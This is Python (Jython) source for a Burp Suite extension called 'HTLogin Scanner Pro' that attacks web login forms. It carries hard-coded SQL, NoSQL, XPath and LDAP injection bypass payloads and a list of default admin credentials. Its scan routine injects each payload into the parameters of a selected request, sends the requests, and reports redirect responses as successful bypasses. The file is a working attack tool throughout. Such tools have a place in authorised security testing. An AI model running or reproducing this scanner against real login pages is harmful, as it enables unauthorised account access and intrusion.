# -*- coding: utf-8 -*-
from burp import IBurpExtender, ITab, IContextMenuFactory
from javax.swing import JMenuItem, JTextArea, JScrollPane, JPanel, JLabel, JButton
from java.awt import BorderLayout, FlowLayout, Color, Font
from java.util import ArrayList
import threading
import re

class BurpExtender(IBurpExtender, ITab, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("HTLogin Scanner Pro")


        self.PAYLOADS = {
            "SQL Injection": [
                "' OR '1'='1", "admin' --", "admin' #", "admin'/*",
                "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*",
                "admin' OR '1'='1", "admin' OR '1'='1' --",
                "admin' OR '1'='1' #", "admin' OR '1'='1'/*"
            ],
            "NoSQL Injection": [
                '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
                '{"$in": [null, ""]}', '{"$exists": true}'
            ],
            "XPath Injection": [
                "' or '1'='1", "' or ''='", "' or 1]%00", "' or /* or '",
                "' or \"a\" or '", "' or 1 or '", "' or true() or '",
                "'or string-length(name(.))<10 or'", "'or contains(name,'adm') or'",
                "'or contains(.,'adm') or'", "'or position()=2 or'",
                "admin' or '", "admin' or '1'='2"
            ],
            "LDAP Injection": [
                "*", "*)(&", "*)(|(&", "pwd)", "*)(|(*", "*))%00",
                "admin)(&)", "pwd", "admin)(!(&(|", "pwd))", "admin))(|(|"
            ]
        }

        self.DEFAULT_CREDS = [
            "admin:admin", "admin:password", "admin:password123",
            "admin:passw0rd", "admin:", "admin:12345", "administrator:password"
        ]

        self.init_ui()
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        print("HTLogin Scanner Pro: JSON support and UI loaded.")

    def init_ui(self):
        self.main_panel = JPanel(BorderLayout())
        top_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        top_panel.add(JLabel("Status: "))
        self.status_label = JLabel("Ready")
        self.status_label.setForeground(Color(0, 102, 204))
        top_panel.add(self.status_label)

        btn_clear = JButton("Clear Logs", actionPerformed=self.clear_logs)
        top_panel.add(btn_clear)

        self.log_area = JTextArea(25, 80)
        self.log_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        self.log_area.setEditable(False)
        self.log_area.setBackground(Color(245, 245, 245))
        self.main_panel.add(top_panel, BorderLayout.NORTH)
        self.main_panel.add(JScrollPane(self.log_area), BorderLayout.CENTER)

    def log(self, text):
        self.log_area.append(text + "\n")
        self.log_area.setCaretPosition(self.log_area.getDocument().getLength())

    def clear_logs(self, event):
        self.log_area.setText("")
        self.status_label.setText("Logs cleared.")

    def getTabCaption(self): return "HTLogin Pro"
    def getUiComponent(self): return self.main_panel

    def createMenuItems(self, invocation):
        self._invocation = invocation
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Run HTLogin Scanner", actionPerformed=self.start_scan))
        return menu_list

    def start_scan(self, event):
        messages = self._invocation.getSelectedMessages()
        if messages:
            self.status_label.setText("Scanning...")
            threading.Thread(target=self.run_logic, args=(messages[0],)).start()

    def run_logic(self, messageInfo):
        request_info = self._helpers.analyzeRequest(messageInfo)
        params = request_info.getParameters()

        self.log("\n" + "="*70)
        self.log("[*] TARGET: " + str(request_info.getUrl()))
        self.log("[*] Parameters found: " + str(len(params)))
        self.log("="*70)


        for category, payloads in self.PAYLOADS.items():
            self.log("\n[>] Category: " + category)
            for payload in payloads:
                for param in params:

                    if param.getType() in [0, 1, 6]:
                        new_req = self.create_patched_request(messageInfo, param, payload)
                        if new_req:
                            resp = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), new_req)
                            self._callbacks.addToSiteMap(resp)
                            if self.is_success(resp):
                                self.log("[!!!] SUCCESS: " + category)
                                self.log("      Param: " + param.getName())
                                self.log("      Payload: " + payload)


        self.log("\n[>] Testing Default Credentials...")
        user_p = self.find_p(params, ["user", "username", "email", "login"])
        pass_p = self.find_p(params, ["pass", "password", "pwd"])

        if user_p and pass_p:
            for cred in self.DEFAULT_CREDS:
                u, p = cred.split(":", 1)

                temp_req = self.create_patched_request(messageInfo, user_p, u)

                final_req = self.create_patched_request_from_bytes(temp_req, pass_p, p)

                resp = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), final_req)
                self._callbacks.addToSiteMap(resp)
                if self.is_success(resp):
                    self.log("[!!!] VALID CREDS: " + cred)

        self.log("\n[V] Scan finished.")
        self.status_label.setText("Completed.")

    def create_patched_request(self, messageInfo, param, value):
        return self.create_patched_request_from_bytes(messageInfo.getRequest(), param, value)

    def create_patched_request_from_bytes(self, request_bytes, param, value):
        try:
            if param.getType() == 6:
                req_str = self._helpers.bytesToString(request_bytes)
                request_info = self._helpers.analyzeRequest(request_bytes)
                offset = request_info.getBodyOffset()
                headers = req_str[:offset]
                body = req_str[offset:]


                pattern = r'("' + re.escape(param.getName()) + r'"\s*:\s*")([^"]*)(")'
                escaped_value = value.replace('\\', '\\\\').replace('"', '\\"')
                new_body = re.sub(pattern, r'\1' + escaped_value + r'\3', body)
                return self._helpers.stringToBytes(headers + new_body)
            else:
                new_param = self._helpers.buildParameter(param.getName(), value, param.getType())
                return self._helpers.updateParameter(request_bytes, new_param)
        except Exception as e:
            self.log("[-] Patching error: " + str(e))
            return None

    def is_success(self, rr):
        if not rr.getResponse(): return False
        resp_info = self._helpers.analyzeResponse(rr.getResponse())
        return resp_info.getStatusCode() in [302, 301]

    def find_p(self, params, names):
        for p in params:
            if any(n in p.getName().lower() for n in names): return p
        return None